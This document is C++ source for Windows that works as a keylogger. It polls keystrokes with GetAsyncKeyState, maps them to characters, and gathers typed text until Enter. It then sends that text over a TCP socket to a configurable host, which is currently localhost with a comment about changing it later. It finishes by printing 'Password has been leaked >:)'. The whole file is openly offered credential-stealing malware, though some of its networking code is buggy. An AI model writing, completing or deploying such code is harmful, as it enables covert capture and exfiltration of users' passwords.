#include <iostream>
#include <windows.h>
#include <string.h>
#include <wchar.h>
#include <winuser.h>
#include <windef.h>
#include <WinSock2.h>
#include <Windows.h>
#include <ws2tcpip.h>
#include <map>

#define IsPressed 0x8000
#define PortNumber "http"
#define cur_thread 0

using namespace std;

bool DoesValGiveChar(int KeyCode) {
    return 16 <= KeyCode && KeyCode <= 255;
}

bool IsKeyPressed(int KeyCode) {

    return (bool)(GetAsyncKeyState(KeyCode) & IsPressed);

}

int main() {

    HKL layout = GetKeyboardLayout(cur_thread);

    char Characters[90] = "AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz1234567890!@#$%¨&*(){}[]~;:/?|'-_=+";
    map<SHORT, char> ValToCharMap;

    for (int ind = 0; ind < 90; ind++) {
        SHORT input_val = VkKeyScanExA(Characters[ind], layout);
        ValToCharMap.insert({input_val, Characters[ind]});
    }

    string Word = "";
    int ind = 0;

    bool PressedKeys[256] = {false};
    bool EnterPressed = false;

    while (!EnterPressed) {

        bool IsShiftPressed = IsKeyPressed(VK_SHIFT);
        bool IsAltPressed = IsKeyPressed(VK_MENU);
        bool IsCtrlPressed = IsKeyPressed(VK_CONTROL);

        //"An idiot admires complexity, a genius admires simplicity"
        //-Terry Davis

        BYTE KBstate[256]; GetKeyboardState(KBstate);

        for (int KeyCode = 0; KeyCode < 256; KeyCode++) {

            if (IsKeyPressed(KeyCode)) {
                switch (KeyCode) {
                    case VK_RETURN:
                        if (ind > 0) {
                            EnterPressed = true;
                            KeyCode = 255;
                            break;
                        }
                        break;
                    case VK_BACK:
                        if (ind > 0 & !PressedKeys[KeyCode]) {
                            PressedKeys[KeyCode] = true;
                            ind--;
                            Word.pop_back();
                            break;
                        }
                        break;

                    default:
                        if (DoesValGiveChar(KeyCode)) {

                            if (!PressedKeys[KeyCode]) {

                                SHORT KeyVal = KeyCode;
                                KeyVal = (IsShiftPressed) ? KeyVal | 0x100 : KeyVal;
                                KeyVal = (IsAltPressed) ? KeyVal | 0x400 : KeyVal;
                                KeyVal = (IsCtrlPressed) ? KeyVal | 0x200 : KeyVal;
                                wchar_t PressedKey = ValToCharMap[KeyVal];

                                PressedKeys[KeyCode] = true;
                                Word.push_back(PressedKey);
                                ind++;
                            }
                        }
                        break;
                }

                
            } else {
                PressedKeys[KeyCode] = false;
            }
        }

    }

    Sleep(100);

    WSADATA wsaData;
    
    int result = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (result) {
        perror("WSAStartup failed: ");
        return 1;
    }

    struct addrinfo *info = NULL, hints;

    hints.ai_family   = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    PCSTR HostAdress = "http://localhost:8080/"; //I'll change this whenever it becomes necessary

    result = getaddrinfo(HostAdress, PortNumber, &hints, &info);

    if (result) {
        perror("Getaddrinfo failed: ");
        WSACleanup();
        return 1;
    }

    SOCKET TargetSocket = INVALID_SOCKET;

    struct addrinfo *first_unit = info;
    TargetSocket = socket(first_unit->ai_family, first_unit->ai_socktype,
    first_unit->ai_protocol);

    result = connect(TargetSocket, first_unit->ai_addr, (int)first_unit->ai_addrlen);

    if (result == SOCKET_ERROR) {

        while (first_unit != nullptr && result == SOCKET_ERROR) {
            first_unit = first_unit->ai_next;
            result = connect(TargetSocket, first_unit->ai_addr, (int)first_unit->ai_addrlen);
        }
    }

    if (result == SOCKET_ERROR) {
        closesocket(TargetSocket);
        TargetSocket = INVALID_SOCKET;
    }

    freeaddrinfo(info);

    if (TargetSocket == INVALID_SOCKET) {
        perror("Connection failed, unable to connect to the target socket: ");
        WSACleanup();
        return 1;
    }

    int buflen = ind;
    const char* data = Word.c_str();

    result = send(TargetSocket, data, buflen, 0);

    if (result == SOCKET_ERROR) {
        cout << "send failed: " << WSAGetLastError() << endl;
        closesocket(TargetSocket);
        WSACleanup();
        return 1;
    }

    cout << "Password has been leaked >:)" << endl;

    result = shutdown(TargetSocket, SD_SEND);
    if (result == SOCKET_ERROR) {
        cout << "shutdown failed: " << WSAGetLastError() << endl;
        closesocket(TargetSocket);
        WSACleanup();
        return 1;
    }

    closesocket(TargetSocket);
    WSACleanup();

    return 0;
}